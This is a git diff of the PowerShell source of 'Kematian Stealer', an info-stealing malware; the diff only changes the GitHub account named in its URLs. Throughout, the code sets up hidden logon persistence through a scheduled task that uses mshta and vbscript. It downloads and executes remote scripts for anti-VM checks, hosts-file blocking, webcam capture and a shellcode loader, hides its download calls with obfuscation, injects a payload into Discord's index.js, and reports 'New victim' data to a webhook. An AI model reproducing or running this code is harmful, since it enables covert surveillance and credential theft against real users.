@@ -81,10 +81,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -92,14 +92,14 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
 
 function VMPROTECT {
-    $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    $link = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
     Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
@@ -855,7 +855,7 @@ function Backup-Data {
     # Fix webcam hang with unsupported devices
     
     Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
-    $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
+    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
@@ -920,7 +920,7 @@ function Backup-Data {
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
                         if ($content -ne "") {
                             $replacedContent = $content -replace "%WEBHOOK%", $webhook
                             $replacedContent | Set-Content -Path $file.FullName -Force
@@ -934,7 +934,7 @@ function Backup-Data {
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
@@ -1139,7 +1139,7 @@ function Backup-Data {
         "embeds"     = @(
             @{
                 "title"       = "Kematian Stealer"
-                "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
+                "url"         = "https://github.com/Somali-Devs/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
                 "footer"      = @{
